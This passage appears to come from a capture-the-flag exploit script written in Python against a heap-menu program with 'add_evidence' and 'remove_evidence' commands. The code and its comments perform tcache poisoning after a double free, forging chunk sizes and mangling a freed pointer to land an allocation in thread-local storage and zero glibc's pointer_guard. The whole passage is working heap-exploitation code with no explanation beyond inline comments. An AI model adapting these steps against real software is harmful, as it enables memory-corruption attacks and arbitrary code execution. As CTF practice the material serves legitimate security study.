# clear tcache bin and fastbin of size 0x40
for _ in range(10):
    add_evidence(2, 0x38, b'2')

# Stage 4: tcache poisoning after double free to zero pointer_guard in tls
add_evidence(0, 0x38, b'0') # heap_base_addr+0x2310
add_evidence(1, 0x38, b'1'*0x28+b'\x51') # heap_base_addr+0x2350
add_evidence(2, 0x38, b'2') # heap_base_addr+0x2390
remove_evidence(2) # heap_base_addr+0x2390
remove_evidence(1) # heap_base_addr+0x2350
remove_evidence(0) # heap_base_addr+0x2310
# now tcache bin of size 0x40 looks like heap_base_addr+0x2310->heap_base_addr+0x2350->heap_base_addr+0x2390
add_evidence(0, 0x38, b'0'*0x38+b'\x31') # heap_base_addr+0x2310
# now tcache bin of size 0x40 looks like heap_base_addr+0x2350->heap_base_addr+0x2390
remove_evidence(1) # heap_base_addr+0x2350
# now tcache bin of size 0x30 looks like heap_base_addr+0x2350
add_evidence(1, 0x28, p64(((tls_base_addr+0x30)^(heap_base_addr+0x2350)>>12))) # heap_base_addr+0x2350
# now tcache bin of size 0x40 looks like heap_base_addr+0x2350->tls_base_addr+0x30
add_evidence(1, 0x38, b'1') # heap_base_addr+0x2350
# now tcache bin of size 0x40 looks like tls_base_addr+0x30
